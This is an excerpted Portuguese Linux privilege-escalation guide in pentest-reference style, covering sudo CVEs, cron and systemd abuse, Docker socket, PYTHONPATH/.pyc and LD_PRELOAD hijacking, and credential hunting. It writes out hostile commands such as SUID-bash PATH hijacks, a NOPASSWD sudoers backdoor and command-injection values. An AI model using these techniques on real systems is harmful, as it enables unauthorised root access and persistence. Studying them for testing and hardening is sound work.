...
Para obter um contexto mais amplo e conhecer fluxos históricos de enumeração, compare os recursos g0tmi1k, Payatu, SANS, LPE Workshop, Linux-Privilege-Escalation e linux-private-i listados nas referências.<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[10]](#references)[[11]](#references)[[13]](#references)</sup>
...
Sempre **pesquise a versão do kernel no Google**; talvez sua versão do kernel esteja mencionada em algum exploit e, então, você terá certeza de que esse exploit é válido.
...
Escalonamento de privilégios no Linux - Linux Kernel <= 3.19.0-73.8
```bash
...
Aqui está uma [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) para explorar essa [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Antes de executar o exploit, certifique-se de que sua versão do `sudo` é vulnerável e de que ela oferece suporte ao recurso `chroot`.

Para mais informações, consulte o [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/) original.<sup>[[28]](#references)</sup>

### Bypass de regras do Sudo baseadas no host (CVE-2025-32462)

O Sudo anterior à versão 1.9.17p1 (intervalo afetado informado: **1.8.8–1.9.17**) pode avaliar regras do sudoers baseadas no host usando o **hostname fornecido pelo usuário** a partir de `sudo -h <host>` em vez do **hostname real**. Se o sudoers conceder privilégios mais amplos em outro host, você poderá fazer **spoof** desse host localmente.<sup>[[29]](#references)</sup>

Requisitos:
- Versão vulnerável do sudo
- Regras do sudoers específicas para o host (o host não é nem o hostname atual nem `ALL`)
...
```
Explorar falsificando o host permitido:
```bash
sudo -h devbox id
sudo -h devbox -i
```
Se a resolução do nome falsificado for bloqueada, adicione-o a `/etc/hosts` ou use um hostname que já apareça em logs/configs para evitar consultas DNS.
...
Confira a **máquina smasher2 do HTB** para ver um **exemplo** de como esta vuln poderia ser explorada
```bash
...
Se você estiver dentro de um container, comece com a seguinte seção de segurança de containers e, em seguida, avance para as páginas de abuso específicas do runtime:
...
```
Além disso, verifique se **algum compilador está instalado**. Isso é útil caso você precise usar algum exploit de kernel, pois é recomendado compilá-lo na máquina onde você pretende utilizá-lo (ou em uma semelhante).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Software Vulnerável Instalado

Verifique a **versão dos pacotes e serviços instalados**. Talvez exista uma versão antiga do Nagios (por exemplo) que possa ser explorada para elevar privilégios…\
Recomenda-se verificar manualmente a versão dos softwares instalados mais suspeitos.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Se você tiver acesso SSH à máquina, também poderá usar o **openVAS** para verificar a existência de software desatualizado e vulnerável instalado dentro da máquina.

> [!NOTE] > _Observe que esses comandos exibirão muitas informações que serão, em sua maioria, inúteis; portanto, é recomendável usar aplicações como o OpenVAS ou similares, que verificarão se alguma versão do software instalado está vulnerável a exploits conhecidos_
...
top -n 1
```
Sempre verifique se há [**electron/cef/chromium debuggers**](../../software-information/electron-cef-chromium-debugger-abuse.md) em execução; você pode abusar deles para escalar privilégios. O **Linpeas** os detecta verificando o parâmetro `--inspect` na linha de comando do processo.\
...
Um processo filho executado por um **usuário diferente** daquele do processo pai não é automaticamente malicioso, mas é um **sinal útil para triagem**. Algumas transições são esperadas (`root` iniciando um usuário de serviço, gerenciadores de login criando processos de sessão), mas cadeias incomuns podem revelar wrappers, auxiliares de debug, persistência ou limites fracos de confiança em tempo de execução.
...
pstree -alp
```
Se encontrar uma cadeia surpreendente, inspecione a linha de comando do processo pai e todos os arquivos que influenciam seu comportamento (`config`, `EnvironmentFile`, scripts auxiliares, diretório de trabalho, argumentos graváveis). Em vários caminhos reais de privesc, o processo filho em si não era gravável, mas o **config controlado pelo processo pai** ou a cadeia de scripts auxiliares era.

### Executáveis excluídos e arquivos excluídos-abertos

Artefatos de runtime geralmente ainda podem ser acessados **após a exclusão**. Isso é útil tanto para escalada de privilégios quanto para recuperar evidências de um processo que já tem arquivos sensíveis abertos.
...
```
Se `/proc/<PID>/exe` apontar para `(deleted)`, o processo ainda está executando a imagem binária antiga a partir da memória. Esse é um forte sinal para investigação porque:

- o executável removido pode conter strings ou credenciais interessantes
- o processo em execução ainda pode expor file descriptors úteis
...
>
> - **kernel.yama.ptrace_scope = 0**: todos os processos podem ser depurados, desde que tenham o mesmo uid. Essa é a forma clássica de funcionamento do ptrace.
...
> - **kernel.yama.ptrace_scope = 3**: nenhum processo pode ser rastreado com ptrace. Uma vez definido, é necessário reiniciar o sistema para habilitar o ptrace novamente.

#### GDB

Se você tiver acesso à memória de um serviço FTP, por exemplo, poderá obter o Heap e procurar credenciais dentro dele.
```bash
...
ProcDump é uma reimaginação para Linux da clássica ferramenta ProcDump do conjunto de ferramentas Sysinternals para Windows. Obtenha-a em [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714
...
| Apache2 (sessões de autenticação HTTP Basic ativas)         | apache2              |
...
Se um painel web “Crontab UI” (alseambusher/crontab-ui) for executado como root e estiver vinculado apenas ao loopback, ainda será possível acessá-lo por meio de encaminhamento de porta local via SSH e criar uma tarefa privilegiada para realizar a escalada.<sup>[[1]](#references)[[4]](#references)</sup>
...
```
Hardening
- Não execute o Crontab UI como root; restrinja-o a um usuário dedicado e com permissões mínimas
- Faça o bind a localhost e, adicionalmente, restrinja o acesso via firewall/VPN; não reutilize senhas
- Evite incorporar secrets em unit files; use secret stores ou um EnvironmentFile acessível somente pelo root
- Habilite auditoria/logging para execuções de jobs sob demanda

Verifique se algum job agendado está vulnerável. Talvez você possa tirar proveito de um script executado pelo root (wildcard vuln? pode modificar arquivos usados pelo root? usar symlinks? criar arquivos específicos no diretório usado pelo root?).
```bash
crontab -l
...
```
Isso evita falsos positivos. Um diretório periódico com permissão de escrita só é útil se o nome do seu arquivo de payload corresponder às regras locais do `run-parts`.
...
Se, dentro desse crontab, o usuário root tentar executar algum comando ou script sem definir o caminho. Por exemplo: _\* \* \* \* root overwrite.sh_\
...
Se um script executado pelo root tiver um “**\***” dentro de um comando, você poderá explorá-lo para fazer coisas inesperadas (como privesc). Exemplo:
```bash
...
- Por que funciona: no Bash, as expansões ocorrem nesta ordem: expansão de parâmetros/variáveis, substituição de comandos, expansão aritmética, depois divisão de palavras e expansão de nomes de caminho. Portanto, um valor como `$(/bin/bash -c 'id > /tmp/pwn')0` é primeiro substituído (executando o comando), e então o `0` numérico restante é usado na operação aritmética para que o script continue sem erros.
...
- `readlink -f` e `namei -l` ajudam a resolver o destino final e exibir as permissões de cada componente do caminho.
```bash
readlink -f /path/to/link
namei -l /path/to/link
```
Para defensores/desenvolvedores, padrões mais seguros contra truques com symlinks incluem:

- `O_EXCL` com `O_CREAT`: falha se o caminho já existir (bloqueia links/arquivos pré-criados pelo atacante).
...
Equipes de defesa às vezes "assinam" binários acionados pelo cron despejando uma seção ELF personalizada e fazendo grep por uma string do fornecedor antes de executá-los como root. Se esse binário tiver permissão de escrita para o grupo (por exemplo, `/opt/AV/periodic-checks/monitor` pertencente a `root:devs 770`) e você puder fazer leak do material de assinatura, poderá forjar a seção e sequestrar a tarefa do cron:<sup>[[2]](#references)</sup>
...
2. Recrie o certificado esperado usando a chave/config obtida por leak (de `signing.zip`):
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Crie uma substituição maliciosa (por exemplo, adicione um bash SUID ou sua chave SSH) e incorpore o certificado em `.text_sig` para que o grep seja aprovado:
```bash
...
```
5. Aguarde a próxima execução do cron; quando a verificação ingênua da assinatura for aprovada, seu payload será executado como root.

### Tarefas cron frequentes

Você pode monitorar os processos para procurar processos executados a cada 1, 2 ou 5 minutos. Talvez seja possível tirar proveito disso para escalar privilégios.

Por exemplo, para **monitorar a cada 0,1 s durante 1 minuto**, **ordenar pelos comandos menos executados** e excluir os comandos que foram executados com mais frequência, você pode fazer:
```bash
...
### Backups de root que preservam bits de modo definidos pelo atacante (pg_basebackup)

Se um cron de propriedade de root executar `pg_basebackup` (ou qualquer cópia recursiva) em um diretório de banco de dados no qual você pode escrever, você pode plantar um **binário SUID/SGID** que será recopiado como **root:root**, com os mesmos bits de modo, no diretório de saída do backup.<sup>[[26]](#references)</sup>

Fluxo típico de descoberta (como um usuário de banco de dados com poucos privilégios):
- Use `pspy` para identificar um cron de root executando algo como `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` a cada minuto.
- Confirme se o cluster de origem (por exemplo, `/var/lib/postgresql/14/main`) permite escrita por você e se o destino (`/opt/backups/current`) passa a pertencer a root após a execução do job.
...
### Tarefas cron invisíveis

É possível criar um cronjob **colocando um retorno de carro após um comentário** (sem caractere de nova linha), e a tarefa cron funcionará. Exemplo (observe o caractere de retorno de carro):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
Para detectar esse tipo de entrada furtiva, inspecione os arquivos cron com ferramentas que exibam caracteres de controle:
```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
...
### Binários de serviços com permissão de escrita

Tenha em mente que, se você tiver **permissões de escrita sobre binários executados por serviços**, poderá modificá-los para incluir backdoors; assim, quando os serviços forem executados novamente, os backdoors serão executados.
...
```
Se você descobrir que pode **escrever** em alguma das pastas do caminho, talvez consiga **escalate privileges**. Você precisa procurar **relative paths sendo usados em arquivos de configuração de serviços**, como:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Em seguida, crie um **executável** com o **mesmo nome que o binário do caminho relativo** dentro da pasta do PATH do systemd na qual você pode escrever e, quando o serviço for solicitado a executar a ação vulnerável (**Start**, **Stop**, **Reload**), seu **backdoor será executado** (usuários não privilegiados geralmente não podem iniciar/parar serviços, mas verifique se você pode usar `sudo -l`).

**Saiba mais sobre serviços com `man systemd.service`.**

## **Timers**

**Timers** são arquivos de unidade do systemd cujo nome termina em `**.timer**` e que controlam arquivos `**.service**` ou eventos. **Timers** podem ser usados como alternativa ao cron, pois têm suporte integrado para eventos de horário de calendário e eventos de horário monotônico, e podem ser executados de forma assíncrona.
...
Se você puder modificar um timer, poderá fazê-lo executar algumas unidades de systemd.unit (como um `.service` ou um `.target`)
```bash
Unit=backdoor.service
```
Na documentação, você pode ler o que é a Unit:

> A unit a ser ativada quando este timer expirar. O argumento é um nome de unit cujo sufixo não é ".timer". Se não for especificado, esse valor será padrão para um service que tenha o mesmo nome que a unit do timer, exceto pelo sufixo. (Veja acima.) Recomenda-se que o nome da unit ativada e o nome da unit do timer sejam idênticos, exceto pelo sufixo.
...
- `Accept`: Aceita um argumento booleano. Se **true**, uma **instância de serviço é criada para cada conexão recebida** e somente o socket da conexão é passado para ela. Se **false**, todos os próprios sockets de escuta são **passados para a unidade de serviço iniciada**, e apenas uma unidade de serviço é criada para todas as conexões. Esse valor é ignorado para sockets de datagrama e FIFOs, nos quais uma única unidade de serviço trata incondicionalmente todo o tráfego recebido. **O padrão é false**. Por motivos de desempenho, é recomendado escrever novos daemons apenas de uma forma compatível com `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Aceitam uma ou mais linhas de comando, que são **executadas antes** ou **depois** que os **sockets**/FIFOs de escuta sejam **criados** e associados, respectivamente. O primeiro token da linha de comando deve ser um nome de arquivo absoluto, seguido pelos argumentos do processo.
...
- `Service`: Especifica o nome da unidade de **serviço** **a ser ativada** quando houver **tráfego recebido**. Essa configuração só é permitida para sockets com `Accept=no`. O padrão é o serviço que possui o mesmo nome do socket (com o sufixo substituído). Na maioria dos casos, não deve ser necessário usar essa opção.

### Arquivos .socket graváveis

Se você encontrar um arquivo `.socket` **gravável**, poderá **adicionar** no início da seção `[Socket]` algo como: `ExecStartPre=/home/kali/sys/backdoor`, e o backdoor será executado antes que o socket seja criado. Portanto, você **provavelmente precisará esperar até que a máquina seja reiniciada.**\
...
Observe que pode haver alguns **sockets escutando por requisições HTTP** (_não estou falando de arquivos .socket, mas dos arquivos que atuam como unix sockets_). Você pode verificar isso com:
```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```
Se o socket **responder com uma solicitação HTTP**, então você poderá **comunicar-se** com ele e talvez **explorar alguma vulnerabilidade**.

### Socket Docker com permissão de escrita

O socket Docker, geralmente encontrado em `/var/run/docker.sock`, é um arquivo crítico que deve ser protegido. Por padrão, ele pode ser gravado pelo usuário `root` e pelos membros do grupo `docker`. Ter acesso de escrita a esse socket pode levar à escalação de privilégios. Veja a seguir como isso pode ser feito e métodos alternativos caso a Docker CLI não esteja disponível.

#### **Escalação de privilégios com a Docker CLI**

Se você tiver acesso de escrita ao socket Docker, poderá escalar privilégios usando os seguintes comandos:<sup>[[15]](#references)</sup>
```bash
...
```
Esse padrão geralmente é mais robusto do que tentar executar `attach` manualmente com `socat` ou `nc -U`. Depois que você puder criar um helper com `/:/host`, poderá usar instâncias adicionais de `exec` para ler arquivos como `/host/root/...`, adicionar chaves SSH em `/host/root/.ssh` ou modificar arquivos de inicialização do host.

### Outros

Observe que, se você tiver permissões de escrita no socket do docker por estar **dentro do grupo `docker`**, terá [**mais maneiras de escalar privilégios**](../../user-information/interesting-groups-linux-pe/index.html#docker-group). Se a [**API do docker estiver escutando em uma porta**](../../../network-services-pentesting/2375-pentesting-docker.md#compromising), você também poderá comprometê-la.
...
## Escalada de privilégios com Containerd (ctr)
...
## Escalada de privilégios com **RunC**
...
D-Bus é um sofisticado **sistema de comunicação entre processos (IPC)** que permite que aplicações interajam e compartilhem dados de forma eficiente. Projetado considerando os sistemas Linux modernos, ele oferece um framework robusto para diferentes formas de comunicação entre aplicações.<sup>[[16]](#references)</sup>

O sistema é versátil e oferece IPC básico, aprimorando a troca de dados entre processos, de forma semelhante a **UNIX domain sockets aprimorados**. Além disso, ele auxilia na transmissão de eventos ou sinais, promovendo uma integração perfeita entre os componentes do sistema. Por exemplo, um sinal de um daemon Bluetooth sobre uma chamada recebida pode fazer com que um music player seja silenciado, melhorando a experiência do usuário. Adicionalmente, o D-Bus oferece um sistema de objetos remotos, simplificando solicitações de serviços e invocações de métodos entre aplicações e agilizando processos que antes eram complexos.

O D-Bus opera em um **modelo de allow/deny**, gerenciando permissões de mensagens (chamadas de métodos, emissões de sinais etc.) com base no efeito cumulativo das regras de política correspondentes. Essas políticas especificam as interações com o barramento e podem permitir a escalada de privilégios por meio da exploração dessas permissões.

Um exemplo de uma dessas políticas em `/etc/dbus-1/system.d/wpa_supplicant.conf` é fornecido, detalhando as permissões do usuário root para possuir, enviar e receber mensagens de `fi.w1.wpa_supplicant1`.
...
lsof -i
```
### Triagem rápida da filtragem de saída
...
```
Classifique os listeners por destino de bind:

- `0.0.0.0` / `[::]`: expostos em todas as interfaces locais.
- `127.0.0.1` / `::1`: apenas locais (bons candidatos para tunnel/forward).
...
### Fluxo de triagem de serviços apenas locais
...
Verifique se você consegue sniffar o tráfego. Se conseguir, poderá capturar algumas credenciais.
```
timeout 1 tcpdump
```
...
ip -br addr
```
O Loopback (`lo`) é especialmente valioso em post-exploitation porque muitos serviços acessíveis apenas internamente expõem tokens/cookies/credenciais nele:
```bash
...
```
Este exemplo, **baseado na máquina Admirer do HTB**, era **vulnerável** a **PYTHONPATH hijacking** para carregar uma biblioteca Python arbitrária enquanto executava o script como root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Poisoning de `__pycache__` / `.pyc` em imports de Python permitidos pelo sudo
...
- O interpretador valida o **cabeçalho** (metadados de magic + timestamp/hash vinculados ao código-fonte) e, em seguida, executa o objeto de código marshalizado armazenado após esse cabeçalho.
...
3. Compile um objeto de código de payload, faça `marshal.dumps(...)` dele, exclua o arquivo de cache original e recrie-o com o header original seguido do seu bytecode malicioso.
4. Execute novamente o script permitido pelo sudo para que o import execute o seu payload como root.

Observações importantes:

- Reutilizar o header original é essencial porque o Python verifica os metadados do cache em relação ao arquivo-fonte, e não se o corpo do bytecode realmente corresponde ao código-fonte.
...
- Garanta que nenhum diretório no Python import path privilegiado possa ser gravado por usuários com poucos privilégios, incluindo `__pycache__`.
- Para execuções privilegiadas, considere `PYTHONDONTWRITEBYTECODE=1` e verificações periódicas em busca de diretórios `__pycache__` inesperadamente graváveis.
- Trate módulos Python locais graváveis e diretórios de cache graváveis da mesma forma que trataria shell scripts ou shared libraries graváveis executados pelo root.

### BASH_ENV preservado via sudo env_keep → root shell

Se o sudoers preservar `BASH_ENV` (por exemplo, `Defaults env_keep+="ENV BASH_ENV"`), você poderá aproveitar o comportamento de inicialização não interativa do Bash para executar código arbitrário como root ao invocar um comando permitido.<sup>[[24]](#references)</sup>

- Por que funciona: em shells não interativos, o Bash avalia `$BASH_ENV` e faz source desse arquivo antes de executar o script de destino. Muitas regras do sudo permitem executar um script ou um shell wrapper. Se `BASH_ENV` for preservado pelo sudo, seu arquivo será carregado com privilégios de root.<sup>[[23]](#references)</sup>
...
### Terraform via sudo com `!env_reset`

Se o sudo deixar o ambiente intacto (`!env_reset`) ao permitir `terraform apply`, `$HOME` permanecerá como o do usuário que iniciou a chamada. Assim, o Terraform carregará **$HOME/.terraformrc** como root e respeitará `provider_installation.dev_overrides`.<sup>[[25]](#references)</sup>
...
```
O Terraform falhará no handshake do plugin Go, mas executará o payload como root antes de falhar, deixando um shell SUID para trás.

### Bypass da validação de symlinks + overrides de TF_VAR

As variáveis do Terraform podem ser fornecidas por meio de variáveis de ambiente `TF_VAR_<name>`, que permanecem disponíveis quando o sudo preserva o ambiente. Validações fracas, como `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")`, podem ser contornadas com symlinks:<sup>[[25]](#references)</sup>
```bash
...
```
Terraform resolve o symlink e copia o `/root/root.txt` real para um destino legível pelo atacante. A mesma abordagem pode ser usada para **escrever** em caminhos privilegiados, pré-criando symlinks no destino (por exemplo, apontando o caminho de destino do provider para dentro de `/etc/cron.d/`).

### requiretty / !requiretty

Em algumas distribuições mais antigas, o sudo pode ser configurado com `requiretty`, o que força o sudo a ser executado apenas a partir de um TTY interativo. Se `!requiretty` estiver definido (ou a opção estiver ausente), o sudo poderá ser executado a partir de contextos não interativos, como reverse shells, cron jobs ou scripts.
```bash
Defaults !requiretty
```
...
Se `sudo -l` mostrar `env_keep+=PATH` ou um `secure_path` contendo entradas graváveis pelo atacante (por exemplo, `/home/<user>/bin`), qualquer comando relativo dentro do alvo permitido pelo sudo poderá ser sobrescrito.<sup>[[3]](#references)</sup>

- Requisitos: uma regra do sudo (geralmente `NOPASSWD`) que execute um script/binário que chame comandos sem caminhos absolutos (`free`, `df`, `ps`, etc.) e uma entrada gravável do PATH que seja pesquisada primeiro.
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
...
```
### Bypass de caminhos na execução do Sudo
...
Se a **permissão sudo** for concedida para um único comando **sem especificar o caminho**: _hacker10 ALL= (root) less_, você poderá explorá-la alterando a variável PATH
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Essa técnica também pode ser usada se um binário **suid** **executar outro comando sem especificar o caminho até ele (sempre verifique com** _**strings**_ **o conteúdo de um binário SUID estranho)**.
...
Uma configuração incorreta comum em aplicativos personalizados é um wrapper de binário SUID pertencente ao root que executa um script, enquanto o próprio script pode ser gravado por usuários com poucos privilégios.
...
```
Se `/usr/local/bin/backup.sh` for gravável, você pode acrescentar comandos de payload e então executar o wrapper SUID:
```bash
...
A variável de ambiente **LD_PRELOAD** é usada para especificar uma ou mais bibliotecas compartilhadas (arquivos .so) a serem carregadas pelo carregador antes de todas as outras, incluindo a biblioteca C padrão (`libc.so`). Esse processo é conhecido como preloading de uma biblioteca.
...
```
> [!CAUTION]
> Um privesc semelhante pode ser abusado se o atacante controlar a variável de ambiente **LD_LIBRARY_PATH**, pois ele controla o caminho onde as bibliotecas serão procuradas.
```c
#include <stdio.h>
#include <stdlib.h>
...
```
Finalmente, executar o binário SUID afetado deve acionar o exploit, possibilitando um potencial comprometimento do sistema.
...
```
isso significa que a library que você gerou precisa ter uma função chamada `a_function_name`.
...
Nos casos em que você tem **acesso ao sudo**, mas não tem a senha, pode escalar privilégios **aguardando a execução de um comando sudo e depois sequestrando o token da sessão**.<sup>[[18]](#references)</sup>

Requisitos para escalar privilégios:

- Você já tem um shell como o usuário "_sampleuser_"
- "_sampleuser_" **usou `sudo`** para executar algo nos **últimos 15 minutos** (por padrão, essa é a duração do token do sudo, que permite usar `sudo` sem fornecer nenhuma senha)
- `cat /proc/sys/kernel/yama/ptrace_scope` é 0
- `gdb` está acessível (você deve conseguir fazer upload dele)
...
- O **primeiro exploit** (`exploit.sh`) criará o binário `activate_sudo_token` em _/tmp_. Você poderá usá-lo para **ativar o token do sudo na sua sessão** (você não obterá automaticamente um root shell; execute `sudo su`):
```bash
bash exploit.sh
...
Se você tiver **permissões de escrita** na pasta ou em qualquer um dos arquivos criados dentro dela, poderá usar o binário [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) para **criar um token do sudo para um usuário e PID**.\
Por exemplo, se você puder sobrescrever o arquivo _/var/run/sudo/ts/sampleuser_ e tiver um shell como esse usuário com o PID 1234, poderá **obter privilégios do sudo** sem precisar saber a senha executando:
```bash
...
**Se** você puder **ler** esse arquivo, poderá **obter algumas informações interessantes** e, se puder **escrever** em qualquer arquivo, poderá **escalar privilégios**.
```bash
...
Linux capabilities fornecem um **subconjunto dos privilégios de root disponíveis a um processo**. Isso efetivamente divide os **privilégios de root em unidades menores e distintas**. Cada uma dessas unidades pode então ser concedida independentemente aos processos. Dessa forma, o conjunto completo de privilégios é reduzido, diminuindo os riscos de exploração.\
...
Em um diretório, o **bit de "execução"** implica que o usuário afetado pode entrar na pasta usando "**cd**".\
...
```
### Backdoor de ACL oculta em arquivos adicionais do sudoers

Uma configuração incorreta comum é um arquivo pertencente ao root em `/etc/sudoers.d/` com modo `440` que ainda concede acesso de escrita a um usuário com baixos privilégios por meio de uma ACL.
```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```
Se você vir algo como `user:alice:rw-`, o usuário poderá acrescentar uma regra do sudo apesar dos bits de modo restritivos:
```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```
Este é um caminho de persistência/privesc de alto impacto por ACL, pois é fácil não identificá-lo em revisões que usam apenas `ls -l`.

## Sessões de shell abertas

Em **versões antigas**, você pode fazer **hijack** de alguma sessão de **shell** de outro usuário (**root**).\
Nas **versões mais recentes**, você poderá **connect** a sessões do screen apenas do **seu próprio usuário**. No entanto, poderá encontrar **informações interessantes dentro da sessão**.

### Hijacking de sessões do screen
...
```
![hijacking de sessões do screen - Localizações dos sockets (alguns sistemas expõem um como symlink do outro): ls /run/screen/ /var/run/screen/ 2 /dev/null](<../../images/image (141).png>)
...
Este era um problema com **versões antigas do tmux**. Não consegui sequestrar uma sessão do tmux (v2.1) criada pelo root como um usuário sem privilégios.
...
Esse bug ocorre ao criar uma nova chave SSH nesses sistemas operacionais, pois **apenas 32.768 variações eram possíveis**. Isso significa que todas as possibilidades podem ser calculadas e, **tendo a chave pública SSH, é possível procurar pela chave privada correspondente**. Você pode encontrar as possibilidades calculadas aqui: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)
...
- **PermitEmptyPasswords**: Quando a autenticação por senha está habilitada, especifica se o servidor permite login em contas com strings de senha vazias. O padrão é `no`.

### Arquivos de controle de login

Esses arquivos influenciam quem pode fazer login e como:

- **`/etc/nologin`**: se estiver presente, bloqueia logins de usuários não root e exibe sua mensagem.
- **`/etc/securetty`**: restringe onde o root pode fazer login (allowlist de TTYs).
...
Especifica os arquivos que contêm as chaves públicas que podem ser usadas para autenticação do usuário. Pode conter tokens como `%h`, que serão substituídos pelo diretório home. **Você pode indicar caminhos absolutos** (que começam com `/`) ou **caminhos relativos ao home do usuário**. Por exemplo:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Essa configuração indicará que, se você tentar fazer login com a chave **private** do usuário "**testusername**", o SSH comparará a chave **public** da sua chave com as localizadas em `/home/testusername/.ssh/authorized_keys` e `/home/testusername/access`
...
ForwardAgent yes
```
Observe que, se `Host` for `*`, sempre que o usuário se conectar a uma máquina diferente, esse host poderá acessar as chaves (o que é um problema de segurança).
...
Se você descobrir que o Forward Agent está configurado em um ambiente, leia a página a seguir, pois **talvez seja possível abusar dele para escalar privilégios**:
...
```
Se algum script de profile suspeito for encontrado, você deve verificá-lo em busca de **detalhes sensíveis**.
...
```
Depois, adicione o usuário `hacker` e a senha gerada.
```
...
Como alternativa, você pode usar as linhas a seguir para adicionar um usuário dummy sem uma senha.\
...
```
### Localização/arquivos de propriedade estranhos
```bash
...
Leia o código do [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), ele procura **vários arquivos possíveis que podem conter senhas**.\
**Outra ferramenta interessante** que você pode usar para isso é: [**LaZagne**](https://github.com/AlessandroZ/LaZagne), que é uma aplicação open source usada para recuperar várias senhas armazenadas em um computador local com Windows, Linux e Mac.

### Logs

Se você conseguir ler logs, poderá encontrar **informações interessantes/confidenciais dentro deles**. Quanto mais estranho for o log, mais interessante ele provavelmente será.\
Além disso, alguns **audit logs** mal configurados (com backdoor?) podem permitir que você **registre senhas** dentro de audit logs, conforme explicado nesta publicação: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).<sup>[[36]](#references)</sup>
```bash
...
~/.zshrc #zsh shell
```
### Busca/Regex por Credenciais Genéricas

Você também deve verificar arquivos que contenham a palavra "**password**" no **nome** ou dentro do **conteúdo**, além de procurar IPs e e-mails dentro de logs ou expressões regulares de hashes.\
...
Se você souber **de onde** um script Python será executado e **puder escrever dentro** dessa pasta ou **modificar bibliotecas Python**, poderá modificar a biblioteca do sistema e inserir um backdoor nela (se puder escrever no local onde o script Python será executado, copie e cole a biblioteca os.py).
...
Se, por qualquer motivo, um usuário puder **escrever** um script `ifcf-<whatever>` em _/etc/sysconfig/network-scripts_ **ou** puder **ajustar** um existente, então seu **sistema está pwned**.<sup>[[20]](#references)</sup>

Scripts de rede, como _ifcg-eth0_, por exemplo, são usados para conexões de rede. Eles se parecem exatamente com arquivos .INI. No entanto, eles são \~carregados\~ no Linux pelo Network Manager (dispatcher.d).

No meu caso, o atributo `NAME=` nesses scripts de rede não é tratado corretamente. Se houver **espaço em branco** no nome, o sistema tenta executar a parte depois do espaço em branco. Isso significa que **tudo após o primeiro espaço em branco é executado como root**.
...
O diretório `/etc/init.d` contém **scripts** para o init do System V (SysVinit), o **sistema clássico de gerenciamento de serviços do Linux**. Ele inclui scripts para `start`, `stop`, `restart` e, às vezes, `reload` de serviços. Eles podem ser executados diretamente ou por meio de links simbólicos encontrados em `/etc/rc?.d/`. Um caminho alternativo nos sistemas Redhat é `/etc/rc.d/init.d`.
...
### Escalação de privilégios via NFS
...
## LPE de descoberta de serviços do VMware Tools (CWE-426) via exec baseado em regex (CVE-2025-41244)

A descoberta de serviços orientada por regex no VMware Tools/Aria Operations pode extrair um caminho de binário das linhas de comando dos processos e executá-lo com `-v` em um contexto privilegiado. Padrões permissivos (por exemplo, usando `\S`) podem corresponder a listeners preparados pelo atacante em locais com permissão de escrita (por exemplo, `/tmp/httpd`), levando à execução como root (CWE-426 Untrusted Search Path).<sup>[[27]](#references)</sup>

Saiba mais e veja um padrão generalizado aplicável a outras stacks de descoberta/monitoramento aqui:
...
- [1] [0xdf – HTB Planning (Privesc via Crontab UI, reutilização de credenciais com zip -P)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [2] [0xdf – HTB Era: payload .text_sig forjado para monitor executado pelo cron](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [3] [0xdf – Holiday Hack Challenge 2025: Bypass do Neighborhood Watch (sequestro de PATH via sudo env_keep)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [4] [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [5] [Escalação básica de privilégios no Linux](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [6] [Guia de escalação de privilégios no Linux](https://payatu.com/guide-linux-privilege-escalation/)
- [7] [Ataque e defesa: técnicas de escalação de privilégios no Linux de 2016](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [8] [Ninguém espera execução de comandos!](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [9] [Sudo (LD_PRELOAD) (Escalação de privilégios no Linux)](https://touhidshaikh.com/blog/?p=827)
- [10] [lpeworkshop – Guia dos exercícios do laboratório - Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [11] [frizb/Linux-Privilege-Escalation: dicas e truques para escalação de privilégios no Linux](https://github.com/frizb/Linux-Privilege-Escalation)
- [12] [lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [13] [rtcrowley/linux-private-i: ferramenta de enumeração e escalação de privilégios no Linux](https://github.com/rtcrowley/linux-private-i)
...
- [16] [Acessando o D-BUS](https://www.linuxjournal.com/article/7744)
- [17] [Executáveis SUID e escalação de privilégios no Linux](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
